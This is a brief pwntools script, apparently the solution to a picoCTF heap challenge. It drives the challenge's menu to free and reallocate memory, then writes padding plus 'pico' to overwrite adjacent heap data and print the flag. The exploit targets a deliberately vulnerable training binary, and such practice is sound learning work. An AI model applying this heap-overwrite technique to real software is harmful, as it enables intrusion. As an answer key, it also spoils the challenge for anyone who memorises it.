from pwn import *

context.arch = 'amd64'
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('tethys.picoctf.net', 64133)
else:
    r = process('./chall')

r.sendlineafter(b'choice: ', b'5')
r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'allocation: ', b'35')
r.sendlineafter(b'flag: ', b'a'*30 + b'pico')

r.sendlineafter(b'choice: ', b'4')
print(r.recvall(timeout=1).decode())